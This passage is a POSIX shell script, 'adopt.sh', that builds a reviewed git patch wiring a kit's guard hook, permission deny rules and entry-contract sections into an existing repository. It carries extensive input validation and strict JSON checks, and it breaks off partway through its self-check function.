#!/bin/sh
# adopt.sh — `sparkwright adopt`: compose ONE reviewed patch that wires the kit's guard into an existing repository.
#   sh scripts/adopt.sh <target-repo> --out <patch-file> --team solo|team [--backlog md|github|jira|ado|linear|gitlab] [--existing] [--ci github|gitlab] [--stack S] [--owner @h] [--name N] [--db] [--tracker-url U] [--tracker-project P] [--replace-guard]
#   sh scripts/adopt.sh <target-repo> --out <patch-file> --guard-only [--replace-guard]      (the guard and entry-contract patch only)   ·   sh scripts/adopt.sh --selftest
# Run it from a kit export or checkout, against the repository you are adopting the kit into. It reads the target, builds the patch for
# .claude/settings.json, the two guard scripts, .gitignore and the kit's entry-contract region in CLAUDE.md and AGENTS.md and, unless --guard-only, the files incept stamps
# (REQUIRED-CHECKS.md, WAIVER-REGISTER.md (empty), .kit/tracker.conf and JIRA-SETUP.md, the kit workflows, a ci.yml fitted to the repository and its gate-dispositions.txt,
# CODEOWNERS (inert), .kit/dials.conf), each only when absent, through the kit's own scripts/stamp-lib.sh. The patch opens with a summary of every area.
# It applies the patch to a temp copy and checks the result with the kit's guard-wired.sh, agents-brief.sh, ci-gates.sh, tracker-conf.sh and branch-protection.sh, and only then writes the patch to --out, and then a description for the adoption PR beside it (<patch-file>.pr.md; SWAS-1010).
# The person reads the patch and applies it with git apply. Exit: 0 the patch and its PR body written, or nothing to patch · 1 the self-check refused the patch, or a file could not be written
# (the patch removed; nothing left behind) · 129/130/143 a signal · 2 usage or a refused input (nothing written). POSIX sh; dash-clean.
# What it changes: Writes exactly two files, the patch at --out and the PR body at --out plus .pr.md (each mode 600, outside the target repository, never overwriting; the body is written after the patch, and a body that cannot be written removes the patch), and a mktemp -d work directory under TMPDIR (or /tmp, never inside the target) that it removes on exit; never writes inside the target repository, never writes .claude/ or any settings file, never edits CLAUDE.md or AGENTS.md itself (it only puts the new or changed one in the patch), never applies the patch, never calls the network or a forge.
# Guardrails: Refuses (exit 2, nothing written) a target that is not a repository root, a symlinked or dirty path it would patch (CLAUDE.md and AGENTS.md included), a CLAUDE.md or AGENTS.md holding a CR byte, an entry-contract section that is not the file's first one or has prose above it, a kit template it cannot read the region from, a TMPDIR that is unusable or inside the target, a CLAUDE.md or AGENTS.md that the kit's agents-brief.sh entry-contract check refuses as it stands (when there is nothing to patch), a --out inside the target or already present, a PR body path (--out plus .pr.md) already present (a symlink counts), a settings.json that fails the strict-parse gate or has the wrong shape, an unattributable guard.sh command, and a guard script that differs from the kit's unless --replace-guard; reads the wiring and the region from the kit's own files and never sources or evals anything from the target; never prints a settings value.
set -eu

ROOT=$(CDPATH='' cd "$(dirname "$0")/.." && pwd)
unset CDPATH GIT_DIR GIT_WORK_TREE GIT_INDEX_FILE GIT_COMMON_DIR GIT_OBJECT_DIRECTORY GIT_ALTERNATE_OBJECT_DIRECTORIES GIT_CONFIG_COUNT GIT_CONFIG_PARAMETERS GIT_CONFIG GIT_CONFIG_SYSTEM

usage() { echo "usage: adopt.sh <target-repo> --out <patch-file> (--team solo|team [--backlog B] [--existing] [--ci github|gitlab] [--stack S] [--owner @h] [--name N] [--db] [--tracker-url U] [--tracker-project P] | --guard-only) [--replace-guard] [--selftest]" >&2; exit 2; }
die2() { printf '%s\n' "adopt: $1" >&2; exit 2; }
die1() { printf '%s\n' "adopt: $1" >&2; exit 1; }
safe() { printf '%s' "$1" | tr -d '[:cntrl:]' | cut -c1-120; }

DENIES='["Edit(/.claude/**)","Edit(/hooks/**)","Edit(/.kit/**)"]'
GUARD_RE='\A[[:space:]]*((sh|bash)[[:space:]]+)?["\x27]?(\./|\$CLAUDE_PROJECT_DIR/|\$\{CLAUDE_PROJECT_DIR\}/|"\$CLAUDE_PROJECT_DIR"/|"\$\{CLAUDE_PROJECT_DIR\}"/)?\.claude/hooks/guard\.sh["\x27]?[[:space:]]*\z'   # MUT-SUBSTR
GUARDS="guard.sh guard-core.sh"
# The set is fixed to the two names every adapter manifest declares today. A kit adapter that declares a third contextFile makes the lock fail closed here (exit 1) until this list grows.
EC_FILES="CLAUDE.md AGENTS.md"
PATHS=".claude/settings.json .claude/hooks/guard.sh .claude/hooks/guard-core.sh .gitignore $EC_FILES"   # --guard-only's set; a full run adds PATHS_N below (set_paths)
WF_KIT="ratification adopter-gates adopter-tracker-gates adopter-trunk-trace solo-go"
PATHS_N="REQUIRED-CHECKS.md WAIVER-REGISTER.md .kit/tracker.conf .kit/dials.conf JIRA-SETUP.md .github/workflows/ratification.yml .github/workflows/adopter-gates.yml .github/workflows/adopter-tracker-gates.yml .github/workflows/adopter-trunk-trace.yml .github/workflows/solo-go.yml .github/workflows/ci.yml conformance/gate-dispositions.txt .github/CODEOWNERS CODEOWNERS docs/CODEOWNERS"
READ_PATHS="package.json package-lock.json npm-shrinkwrap.json yarn.lock pnpm-lock.yaml"   # read from the target, never patched; a full run dirty-checks the ones the fitted CI reads (SWAS-1009 R8)
NEW_FILES=""; NEW_DIRS=""; SNAP_PATHS=$PATHS
BACKLOG=md; EXISTING=0; TEAM=""; CI=""; STACK=""; OWNER=""; NAME=""; DB=0; TURL=""; TPROJ=""; GUARD_ONLY=0; DATE=""; KIT_VER=""
A_R=0; A_W=0; A_T=0; A_J=0; A_K=""; A_C=0; A_D=0; A_O=0; A_S=0; AREAS_NEW=""; ALREADY_EXTRA=""
TPL="$ROOT/templates/PROJECT-CLAUDE-TEMPLATE.md"

gitx() { env GIT_CONFIG_NOSYSTEM=1 GIT_CONFIG_GLOBAL=/dev/null GIT_OPTIONAL_LOCKS=0 git -c core.fsmonitor=false -c core.hooksPath=/dev/null "$@"; }
gg() { gitx -c user.name=adopt -c user.email=adopt@invalid -c commit.gpgsign=false -c core.fileMode=true -c core.autocrlf=false -c core.safecrlf=false -c diff.renames=false -c init.defaultBranch=main "$@"; }
jqw() { jq --indent 2 --arg c "$GW_CANON" --arg m "$MATCHER" --arg re "$GUARD_RE" --argjson d "$DENIES" "$@"; }

jq_ok() {  # jq 1.7 or later: an older jq rewrites some numbers (a large integer, 1.0)
  _jv=$(jq --version 2>/dev/null) || return 1
  _jv=${_jv#jq-}; _jmaj=${_jv%%.*}; _jr=${_jv#*.}; _jmin=${_jr%%[!0-9]*}
  case "$_jmaj$_jmin" in ''|*[!0-9]*) return 1 ;; esac
  [ "$_jmaj" -gt 1 ] || { [ "$_jmaj" -eq 1 ] && [ "$_jmin" -ge 7 ]; }
}
need_tools() {
  command -v git >/dev/null 2>&1 || die2 "git is required"
  command -v jq >/dev/null 2>&1 || die2 "jq 1.7 or later is required (install it: brew install jq, or apt-get install jq)"
  jq_ok || die2 "jq 1.7 or later is required: an older jq rewrites some numbers (found $(jq --version 2>&1))"
  command -v sha256sum >/dev/null 2>&1 || command -v shasum >/dev/null 2>&1 || die2 "sha256sum or shasum is required"
}
sha256() { if command -v sha256sum >/dev/null 2>&1; then sha256sum "$1" | cut -d' ' -f1; else shasum -a 256 "$1" | cut -d' ' -f1; fi; }

# --- the strict-parse gate: a copy of conformance/guard-wired.sh's _gw_bd_gate tests (one A4 cell per refusal pins the copy) ---
GW_BD_DUPJQ='reduce inputs as $e ({seen: {}, closed: {}, prev: [], dup: false};
  $e[0] as $p |
  if ($e | length) == 1 then
    (if ($p | length) == 1 then . else .closed[($p[0:($p | length) - 1] | tojson)] = true end)
  else
    reduce range(0; $p | length) as $i (.;
      ($p[0:$i + 1]) as $pre | ($pre | tojson) as $k |
      if ($i != (($p | length) - 1)) and (.prev[0:$i + 1] == $pre) and ((.closed[$k] // false) | not) then .
      elif .seen[$k] then .dup = true
      else .seen[$k] = true | .closed[$k] = false
      end)
    | .prev = $p
    | if (($e[1] | type) == "object") or (($e[1] | type) == "array") then .closed[($p | tojson)] = true else . end
  end) | .dup'
bd_dupkeys() {
  _dk=$(jq -n --stream "$GW_BD_DUPJQ" "$1" 2>/dev/null) || return 1
  [ "$_dk" = false ]
}
bd_strict() {
  [ "$(LC_ALL=C tr -d '\011\012\015\040-\377' < "$1" 2>/dev/null | wc -c | tr -d ' ')" = 0 ] || return 1
  [ "$(head -c 3 "$1" 2>/dev/null | od -An -tx1 | tr -d ' \n')" != efbbbf ] || return 1
  awk '{ gsub(/\r/, " "); gsub(/"([^"\\]|\\.)*"/, ""); gsub(/[][{},:]/, " ")
         for (i = 1; i <= NF; i++) { t = $i
           if (t == "true" || t == "false" || t == "null") continue
           if (t ~ /^-?(0|[1-9][0-9]*)(\.[0-9]+)?([eE][+-]?[0-9]+)?$/) continue
           bad = 1 } }
       END { exit bad }' "$1" 2>/dev/null
}
json_strict_code() {  # <file>: JSC = "" when it passes every strict test, else the first test that failed (json multi strict dup proto); prints nothing
  JSC=""
  jq -e . "$1" >/dev/null 2>&1 || { JSC=json; return 0; }
  _gn=$(jq -n '[inputs] | length' "$1" 2>/dev/null) || _gn=0
  [ "$_gn" = 1 ] || { JSC=multi; return 0; }
  bd_strict "$1" || { JSC=strict; return 0; }
  bd_dupkeys "$1" || { JSC=dup; return 0; }
  jq -e '[.. | objects | keys_unsorted[] | select(. == "__proto__" or . == "constructor" or . == "prototype")] | length == 0' "$1" >/dev/null 2>&1 || JSC=proto
}
json_strict_ok() { json_strict_code "$1"; [ -z "$JSC" ]; }   # <file>: rc 0 iff strict JSON; prints nothing
strict_gate() {  # <file>: exits 2 naming the test that failed
  json_strict_code "$1"
  case "$JSC" in
    json) die2 "settings.json is not valid JSON" ;;
    multi) die2 "settings.json holds more than one JSON document (a reader sees only one of them)" ;;
    strict) die2 "settings.json is not strict JSON (a control byte, a BOM, or a NaN, Infinity, leading-zero, .5 or +1 number): jq reads it but Claude Code cannot" ;;
    dup) die2 "settings.json has a duplicate JSON key (a rewrite would drop one of the copies silently)" ;;
    proto) die2 "settings.json uses the key __proto__, constructor or prototype" ;;
  esac
}
SHAPE='type == "object"
  and ((has("hooks") | not) or (.hooks | type == "object"))
  and ((has("permissions") | not) or (.permissions | type == "object"))
  and (((.hooks // {}) | has("PreToolUse") | not) or (.hooks.PreToolUse | type == "array"))
  and (((.permissions // {}) | has("deny") | not) or (.permissions.deny | type == "array"))
  and all(.hooks.PreToolUse[]?; type == "object" and ((has("hooks") | not) or (.hooks | type == "array")))
  and all(.hooks.PreToolUse[]?.hooks[]?; type == "object")'

# --- the jq edits (design 2.3): a guard entry is a command that IS the canonical command, or is only a run of .claude/hooks/guard.sh (the whole command, anchored) ---
JQ_DEFS='def isg: ((.command // "") | if type == "string" then (. == $c or test($re)) else false end);
def kit: {matcher: $m, hooks: [{type: "command", command: $c}]};   # FAULT-KIT
def step($el):
  ($el.hooks // []) as $hs
  | ($hs | map(isg)) as $f
  | if ($f | any | not) then .out += [$el]
    elif .seen then
      ($el | .hooks = [$hs[] | select(isg | not)]) as $e2
      | if ($e2.hooks | length) > 0 then .out += [$e2] else . end
    else
      ($f | index(true)) as $i
      | ($hs[$i] | .command = $c) as $g
      | [$hs[] | select(isg | not)] as $oth
      | .seen = true
      | if ($oth | length) == 0 then .out += [$el | .matcher = $m | .hooks = [$g]]
        elif $el.matcher == $m then .out += [$el | .hooks = [$hs | to_entries[] | select((.value | isg | not) or .key == $i) | .value | if isg then .command = $c else . end]]   # MUT-REMATCH
        else .out += [($el | .hooks = $oth), {matcher: $m, hooks: [$g]}]
        end
    end;
'
EDIT_MAIN='. as $doc
| ([$d[] | select(. as $x | ($doc.permissions.deny // []) | any(.[]; . == $x) | not)]) as $miss   # FAULT-DENY
| (if ([.hooks.PreToolUse[]?.hooks[]? | select(isg)] | length) > 0
   then .hooks.PreToolUse = (reduce .hooks.PreToolUse[] as $el ({out: [], seen: false}; step($el)) | .out)
   else .hooks.PreToolUse = ((.hooks.PreToolUse // []) + [kit]) end)
| if ($miss | length) == 0 then . else .permissions.deny = ((.permissions.deny // []) + $miss) end   # MUT-DROPKEY
'
# The do-no-harm proof: with every guard entry (and an element left empty by that), the three denies and any emptied container removed, both documents are equal.
STRIP='def strip:
  (if (.hooks.PreToolUse? // null) != null then .hooks.PreToolUse |= [.[] | (.hooks // []) as $h | ($h | map(isg)) as $f
      | if ($f | any | not) then . else (.hooks = [$h[] | select(isg | not)]) | if (.hooks | length) == 0 then empty else . end end] else . end)
  | (if (.permissions.deny? // null) != null then .permissions.deny |= map(select(. as $x | $d | any(.[]; . == $x) | not)) else . end)
  | del(.hooks.PreToolUse | select(. == []))
  | del(.hooks | select(. == {}))
  | del(.permissions.deny | select(. == []))
  | del(.permissions | select(. == {}));
$a[0] as $o | $b[0] as $n | ($o | strip) == ($n | strip)'

sem_equal() { [ "$(jq -S . "$1")" = "$(jq -S . "$2")" ]; }   # MUT-NOIDEM
denies_ok() { jq -e --argjson d "$DENIES" '. as $s | all($d[]; . as $x | ($s.permissions.deny // []) | any(.[]; . == $x))' "$1" >/dev/null 2>&1; }
edit_settings() { jqw "$JQ_DEFS $EDIT_MAIN" "$1"; }

# --- the wiring: one source each, read and never sourced (design 2.2 step 7) ---
extract_canon() {  # <guard-wired.sh> -> the one GW_CANON command; rc 1 when the line is missing or doubled
  [ "$(grep -c "^GW_CANON='" "$1" 2>/dev/null)" = 1 ] || return 1
  sed -n "s/^GW_CANON='\\(.*\\)'\$/\\1/p" "$1" | sed "s/'\\\\''/'/g"
}
fence_cmds() { sed -n 's/^[[:space:]]*\({ "type": "command", "command": .* }\)[[:space:]]*$/\1/p' "$1"; }
check_fences() {
  [ -f "$ROOT/docs/adoption/brownfield.md" ] || die2 "docs/adoption/brownfield.md is missing from the kit (it ships in the export); its two guard commands are checked against GW_CANON"
  _fcs=$(fence_cmds "$ROOT/docs/adoption/brownfield.md")
  _fn=$(printf '%s\n' "$_fcs" | grep -c . || true)
  _fok=$(printf '%s\n' "$_fcs" | jq -r '.command' 2>/dev/null | grep -cxF -- "$GW_CANON" || true)
  { [ "$_fn" = 2 ] && [ "$_fok" = 2 ]; } || die2 "docs/adoption/brownfield.md must hold exactly two guard commands, each equal to GW_CANON in conformance/guard-wired.sh"
}
read_wiring() {
  _gwf="$ROOT/conformance/guard-wired.sh"; _ks="$ROOT/.claude/settings.json"
  { [ -f "$_gwf" ] && [ -f "$_ks" ]; } || die2 "run adopt from a kit export or checkout: its conformance/guard-wired.sh and .claude/settings.json are the wiring's sources"
  GW_CANON=$(extract_canon "$_gwf") || GW_CANON=""
  [ -n "$GW_CANON" ] || die2 "conformance/guard-wired.sh must hold exactly one GW_CANON line"
  check_fences
  MATCHER=$(jq -r --arg c "$GW_CANON" '[.hooks.PreToolUse[]? | select(any(.hooks[]?; (.command // "") == $c))] | if length == 1 then (.[0].matcher // "") else "" end' "$_ks" 2>/dev/null) || MATCHER=""
  [ -n "$MATCHER" ] || die2 "the kit's .claude/settings.json must hold exactly one PreToolUse element running the canonical guard command, with a matcher"
  denies_ok "$_ks" || die2 "the kit's .claude/settings.json lacks one of the three Edit denies (Edit(/.claude/**), Edit(/hooks/**), Edit(/.kit/**))"
}

# --- the target (design 2.2 steps 1-6) ---
check_target() {
  case "$TARGET" in ''|*[[:cntrl:]]*) die2 "the target path is empty or has control characters" ;; esac
  [ -d "$TARGET" ] || die2 "the target '$(safe "$TARGET")' is not a directory"
  TROOT=$(CDPATH='' cd -P "$TARGET" 2>/dev/null && pwd -P) || die2 "cannot resolve the target"
  _kreal=$(CDPATH='' cd -P "$ROOT" && pwd -P)
  [ "$TROOT" != "$_kreal" ] || die2 "the target is the kit itself; give the repository you are adopting the kit into"
  case "$TROOT/" in "$_kreal"/*) die2 "the target is inside the kit checkout" ;; esac
  _top=$(gitx -C "$TROOT" rev-parse --show-toplevel 2>/dev/null) || die2 "the target is not a git work tree"
  _top=$(CDPATH='' cd -P "$_top" 2>/dev/null && pwd -P) || die2 "cannot resolve the target's repository root"
  [ "$_top" = "$TROOT" ] || die2 "the target is inside a repository whose root is elsewhere; give the repository root"
}
want_type() {  # <path> <d|f>
  [ -e "$TROOT/$1" ] || return 0
  case "$2" in d) [ -d "$TROOT/$1" ] ;; *) [ -f "$TROOT/$1" ] ;; esac || die2 "$1 is not a regular file or directory of the expected kind"
}
check_paths() {
  for _p in .claude .claude/hooks .claude/settings.json .claude/hooks/guard.sh .claude/hooks/guard-core.sh .gitignore $EC_FILES $NEW_DIRS $NEW_FILES; do
    [ ! -L "$TROOT/$_p" ] || die2 "$_p is a symbolic link; the verb will not read or patch through one"
  done
  want_type .claude d; want_type .claude/hooks d
  want_type .claude/settings.json f; want_type .claude/hooks/guard.sh f; want_type .claude/hooks/guard-core.sh f; want_type .gitignore f
  for _p in $EC_FILES $NEW_FILES; do want_type "$_p" f; done
  for _p in $NEW_DIRS; do want_type "$_p" d; done
  _st=$(gitx -C "$TROOT" status --porcelain=v1 --untracked-files=all -- $PATHS 2>/dev/null) || die2 "git status failed in the target"
  if [ -n "$NEW_FILES" ]; then   # a file the fit reads (package.json, a lockfile) must be committed: an uncommitted or untracked one is refused
    _sr=$(gitx -C "$TROOT" status --porcelain=v1 --untracked-files=all -- $READ_PATHS 2>/dev/null) || die2 "git status failed in the target"
    [ -z "$_sr" ] || die2 "a file the fitted CI reads has an uncommitted change or is untracked in the target (commit it first; after a kit copy-in, commit the copy-in first; docs/adoption/brownfield.md section 2): $(printf '%s' "$_sr" | head -n 1 | cut -c1-80)"
  fi
  if printf '%s\n' "$_st" | grep -v '^??' | grep -q .; then
    die2 "a path the patch touches has an uncommitted change in the target (commit or stash it first; after a kit copy-in, commit the copy-in first; docs/adoption/brownfield.md section 2): $(printf '%s' "$_st" | grep -v '^??' | head -n 1 | cut -c1-80)"
  fi
}
check_out() {
  case "$OUT" in
    *[[:cntrl:]]*) die2 "--out has control characters" ;;
    *"'"*) die2 "--out must not contain a single quote (the git apply line printed at the end quotes the path)" ;;
  esac
  _od=$(dirname -- "$OUT"); _ob=$(basename -- "$OUT")
  case "$_ob" in ''|.|..) die2 "--out must name a file" ;; esac
  [ -d "$_od" ] || die2 "the directory for --out does not exist"
  _odr=$(CDPATH='' cd -P "$_od" 2>/dev/null && pwd -P) || die2 "cannot resolve the directory for --out"
  OUTREAL="$_odr/$_ob"
  case "$OUTREAL" in   # the realpath is checked too: a symlinked directory name can hold what --out itself may not
    *[[:cntrl:]]*) die2 "the resolved --out path has control characters" ;;
    *"'"*) die2 "the resolved --out path must not contain a single quote (the git apply line printed at the end quotes the path)" ;;
  esac
  case "$OUTREAL/" in "$TROOT"/*) die2 "--out must be outside the target repository, so the repository is changed by nothing" ;; esac
  { [ ! -e "$OUTREAL" ] && [ ! -L "$OUTREAL" ]; } || die2 "--out already exists; the verb never overwrites a file"
  PRB="$OUTREAL.pr.md"   # the PR body goes beside the patch, under the same rules (SWAS-1010, errata Q2)
  { [ ! -e "$PRB" ] && [ ! -L "$PRB" ]; } || die2 "the PR body path '$(safe "$PRB")' already exists (a symlink counts); the verb never overwrites a file, so nothing was written"   # MUT-PRCHECK
}
tmp_parent() {  # TPARENT = the physical directory the work directory goes in, ${TMPDIR:-/tmp}; refused when it is unusable or inside the target, before anything is created (BSD mktemp -d ignores TMPDIR, so the parent is named to it)
  _tp=$(CDPATH='' cd -P "${TMPDIR:-/tmp}" 2>/dev/null && pwd -P) || die2 "TMPDIR is not a usable directory; set it to one outside the target, then rerun"
  case "$_tp/" in "$TROOT"/*) die2 "TMPDIR points inside the target repository; set TMPDIR outside it, then rerun" ;; esac
  TPARENT=$_tp
}
check_tmp() {  # a backstop after mktemp: the work directory must never sit inside the target (the EXIT trap removes it on the refusal)
  _tr=$(CDPATH='' cd -P "$T" 2>/dev/null && pwd -P) || die2 "cannot resolve the work directory"
  case "$_tr/" in "$TROOT"/*) die2 "TMPDIR points inside the target repository; set TMPDIR outside it, then rerun" ;; esac
}
check_settings() {
  [ -f "$SJ" ] || return 0
  strict_gate "$SJ"   # MUT-NOGATE
  jq -e "$SHAPE" "$SJ" >/dev/null 2>&1 || die2 "settings.json has the wrong shape: hooks and permissions must be objects, hooks.PreToolUse and permissions.deny arrays, every element and hook entry an object"
  _bad=$(jq -r --arg re "$GUARD_RE" --arg c "$GW_CANON" '[(.hooks.PreToolUse // []) | to_entries[] | .key as $i | ((.value.hooks // []) | to_entries[] | .key as $j
      | select((.value.command // "") | if type == "string" then (. != $c and test("guard\\.sh") and (test($re) | not)) else false end)
      | "hooks.PreToolUse[\($i)].hooks[\($j)]")] | .[0] // empty' "$SJ" 2>/dev/null) || _bad=""
  [ -z "$_bad" ] || die2 "the hook command at $(safe "$_bad") names guard.sh but is not only a run of the kit's .claude/hooks/guard.sh; the verb will not rewrite a command it cannot attribute (its text is not printed)"
}
plan_guards() {  # GUARD_WRITE = the guard scripts the patch carries
  GUARD_WRITE=""
  for _g in $GUARDS; do
    _k="$ROOT/.claude/hooks/$_g"; _t="$T/base/.claude/hooks/$_g"
    [ -f "$_k" ] || die2 "the kit's .claude/hooks/$_g is missing"
    if [ ! -e "$_t" ]; then GUARD_WRITE="$GUARD_WRITE $_g"; continue; fi
    if cmp -s "$_k" "$_t"; then continue; fi
    [ "$REPLACE" -eq 1 ] || die2 ".claude/hooks/$_g differs from the kit's (yours sha256 $(sha256 "$_t"), the kit's $(sha256 "$_k")). The whole verb stops here, the settings wiring included. Guard scripts carry no release marker, so the verb cannot tell an older kit copy from a newer one or from a foreign file; to put the kit's copy in the patch, run again with --replace-guard"
    GUARD_WRITE="$GUARD_WRITE $_g"
  done
}

# --- the plan: what the patch changes, each decided semantically (design 2.3) ---
plan_settings() {  # SET_STATE none|new|changed; REFORMAT 0|1; writes $T/old.json and $T/settings.new
  SET_STATE=none; REFORMAT=0
  if [ -f "$SJ" ]; then cp "$SJ" "$T/old.json"; else printf '{}\n' > "$T/old.json"; fi
  edit_settings "$T/old.json" > "$T/settings.new" || die1 "jq could not compose the settings edit; nothing was written"
  if [ ! -f "$SJ" ]; then SET_STATE=new; return 0; fi
  if sem_equal "$SJ" "$T/settings.new"; then return 0; fi
  SET_STATE=changed
  jq --indent 2 . "$SJ" > "$T/pretty"
  cmp -s "$SJ" "$T/pretty" || REFORMAT=1
}
gi_missing() {
  for _l in .claude/settings.local.json .kit-run/; do
    if [ ! -f "$GI" ] || ! grep -qxF -- "$_l" "$GI"; then printf '%s\n' "$_l"; fi
  done
}
new_gitignore() {
  if [ -f "$GI" ]; then cat "$GI"; [ -z "$(tail -c 1 "$GI")" ] || printf '\n'; fi
  printf '%s\n' "# Local per-developer files, never committed (sparkwright adopt)" "$GI_MISSING"
}

# --- the entry contract (errata E1): the region is the first "## " section of the kit's template, the closing heading is the next "## " line ---
region_of() { LC_ALL=C awk '/^## /{n++; if (n == 2) exit} n == 1' "$1"; }   # a file's first "## " section, every line, newline included
closing_of() { LC_ALL=C awk '/^## /{n++; if (n == 2) {print; exit}}' "$1"; }
preamble_ok() {  # only blank lines and at most one "# " title above the first "## " line
  LC_ALL=C awk '/^## /{exit} /^[[:space:]]*$/{next} /^# /{t++; if (t > 1) {bad = 1; exit} next} {bad = 1; exit} END{exit bad + 0}' "$1"
}
load_region() {  # writes $T/region and $T/closing from the kit's template; an empty one is a damaged kit
  mkdir -p "$T/ec"
  [ -f "$TPL" ] || die2 "the kit's templates/PROJECT-CLAUDE-TEMPLATE.md is missing, so the entry contract cannot be read; use a complete kit export or checkout, then rerun"
  region_of "$TPL" > "$T/region" || die2 "the kit's templates/PROJECT-CLAUDE-TEMPLATE.md could not be read; use a complete kit export or checkout, then rerun"   # FAULT-REGION
  closing_of "$TPL" > "$T/closing" || die2 "the kit's templates/PROJECT-CLAUDE-TEMPLATE.md could not be read; use a complete kit export or checkout, then rerun"
  { [ -s "$T/region" ] && [ -s "$T/closing" ]; } || die2 "the kit's templates/PROJECT-CLAUDE-TEMPLATE.md has no entry-contract section, or no '## ' heading after it; this kit copy is damaged, so use a fresh kit export and rerun"
}
ins_line() {  # the line the region goes before: after a leading "# " title and the blank lines after it, else the top
  LC_ALL=C awk '
    !seen && /^[[:space:]]*$/ { next }
    !seen { seen = 1; if ($0 ~ /^# /) { title = 1; next }; print 1; done = 1; exit }
    title && /^[[:space:]]*$/ { next }
    title { print NR; done = 1; exit }
    END { if (!done) print (title ? NR + 1 : 1) }' "$1"
}
insert_region() {  # <file> -> stdout: the region and the closing heading in, the file's own content following the closing heading
  _ins=$(ins_line "$1")   # MUT-INSBELOW
  if [ "$_ins" -gt 1 ]; then
    head -n "$((_ins - 1))" "$1" > "$T/head"; cat "$T/head"
    [ -z "$(tail -c 1 "$T/head")" ] || echo   # a last line with no newline still ends before the region
    if [ -n "$(tail -n 1 "$T/head")" ]; then echo; fi
  fi
  cat "$T/region" "$T/closing"
  tail -n +"$_ins" "$1" > "$T/rest"
  if [ -s "$T/rest" ]; then echo; cat "$T/rest"; fi
}
sec_lines() { LC_ALL=C awk '/^## /{n++; if (n == 1) a = NR; if (n == 2) {b = NR; exit}} END{print a + 0, b + 0}' "$1"; }   # the line numbers of the first and second "## " lines (0 = none); awk prints numbers, never content
replace_region() {  # <file> -> stdout: the old first "## " section swapped for the kit's; spliced by line number, so every byte outside it is unchanged
  _sl=$(sec_lines "$1"); _sa=${_sl% *}; _sz=${_sl#* }
  [ "$_sa" -le 1 ] || head -n "$((_sa - 1))" "$1"
  cat "$T/region"
  if [ "$_sz" -gt 0 ]; then tail -n +"$_sz" "$1"; else cat "$T/closing"; fi   # an only section: the kit's closing heading follows the region
}
ec_note() { printf '%s\n' "$2" > "$T/ec/$1.kind"; EC_WRITE="$EC_WRITE $1"; }
plan_same() {  # <name>: the first section is the kit's region; judge the line after it (placement rule 3)
  _c=$(closing_of "$T/base/$1")
  if [ -z "$_c" ]; then cat "$T/base/$1" "$T/closing" > "$T/ec/$1"; ec_note "$1" close; fi   # a closing heading that is there is judged by agents-brief.sh (as_is_lock, or the self-check), the one judge of what renders
}
plan_old() {  # <name>: the file's first "## " heading begins "## 1. Entry contract"
  preamble_ok "$T/base/$1" || die2 "$1 has prose above its old entry contract (placement rule 1: only blank lines and one '# ' title may precede it); move the prose below the region, or delete the old region, then rerun"
  region_of "$T/base/$1" > "$T/cur"
  if cmp -s "$T/cur" "$T/region"; then plan_same "$1"; return 0; fi
  replace_region "$T/base/$1" > "$T/ec/$1" || die1 "could not compose the replacement for $1; nothing was written"
  ec_note "$1" replace
}
plan_file() {  # <name>: absent -> a new file; identical -> nothing; old region -> replaced; none -> inserted; misplaced -> refused
  _b="$T/base/$1"
  if [ ! -e "$_b" ]; then cat "$T/region" "$T/closing" > "$T/ec/$1"; ec_note "$1" new; return 0; fi
  [ "$(LC_ALL=C tr -cd '\r' < "$_b" | wc -c | tr -d ' ')" = 0 ] || die2 "$1 has CR (Windows) line endings, and a region spliced into them would mix line endings; convert it to LF line endings and commit that, then rerun"
  _h=$(LC_ALL=C awk '/^## /{print; exit}' "$_b")
  case "$_h" in
    "## 1. Entry contract"*) plan_old "$1"; return 0 ;;
  esac
  if grep -q '^## 1\. Entry contract' "$_b"; then
    die2 "$1 has a '## 1. Entry contract' section that is not its first '## ' section, and the verb will not guess which one is the kit's; move it to the top, or delete it, then rerun"
  fi
  insert_region "$_b" > "$T/ec/$1" || die1 "could not compose the insertion for $1; nothing was written"
  ec_note "$1" insert
}
plan_entry() {  # EC_WRITE = the files the patch carries; $T/ec/<name> holds the new bytes and $T/ec/<name>.kind how they come about
  EC_WRITE=""
  for _f in $EC_FILES; do plan_file "$_f"; done
}
already_notes() {  # a full run that finds nothing new still says what it refused or skipped (a refused area C, a skipped area), so "present or kept" never hides them; the lint block (SWAS-1011) is said in every mode
  rec_each lint | while IFS= read -r _l; do printf '  %s\n' "$_l"; done
  [ "$GUARD_ONLY" -eq 0 ] || return 0
  for _t in ci skipped; do rec_each "$_t" | while IFS= read -r _l; do printf '  [%s] %s\n' "$_t" "$_l"; done; done
}
already() { echo "already adopted: nothing to patch (guard scripts current, settings wired, .gitignore lines present, entry contract current)$ALREADY_EXTRA"; }

# --- the patch: a temp git repo holds the target's current bytes, the changes go on top, git diff makes the patch ---
snapshot_base() {  # the four paths are copied once; every later read, edit and the patch itself use the copy
  mkdir -p "$T/base"
  for _p in $SNAP_PATHS; do
    [ -f "$TROOT/$_p" ] || continue
    [ ! -L "$TROOT/$_p" ] || die2 "$_p is a symbolic link; the verb will not read or patch through one"
    mkdir -p "$T/base/$(dirname "$_p")"
    cp -p "$TROOT/$_p" "$T/base/$_p"
    { [ -f "$T/base/$_p" ] && [ ! -L "$T/base/$_p" ]; } || die2 "$_p changed while it was being read; run again"
  done
}
compose() {
  cp -Rp "$T/base" "$T/w"
  gg init -q "$T/w" || die1 "git init failed in the work directory; nothing was written"
  gg -C "$T/w" add -A -f || die1 "git add failed in the work directory; nothing was written"
  gg -C "$T/w" commit -q --allow-empty -m base || die1 "git commit failed in the work directory; nothing was written"
  if [ "$SET_STATE" != none ]; then mkdir -p "$T/w/.claude"; cat "$T/settings.new" > "$T/w/.claude/settings.json"; fi
  for _g in $GUARD_WRITE; do
    mkdir -p "$T/w/.claude/hooks"; cat "$ROOT/.claude/hooks/$_g" > "$T/w/.claude/hooks/$_g"; chmod 755 "$T/w/.claude/hooks/$_g"
  done
  if [ -n "$GI_MISSING" ]; then new_gitignore > "$T/gi.new"; cat "$T/gi.new" > "$T/w/.gitignore"; fi
  for _f in $EC_WRITE; do cat "$T/ec/$_f" > "$T/w/$_f"; done
  if [ "$GUARD_ONLY" -eq 0 ]; then compose_areas; fi
  gg -C "$T/w" add -A -f || die1 "git add failed in the work directory; nothing was written"
  gg -C "$T/w" diff --cached --no-color --no-ext-diff --src-prefix=a/ --dst-prefix=b/ > "$T/patch" || die1 "git diff failed in the work directory; nothing was written"
}

# --- the self-check (design 2.4): apply to a copy, then guard-wired's own rung 1 plus the verb's assertions ---
verify_applied() {
  cp -Rp "$T/base" "$T/chk"
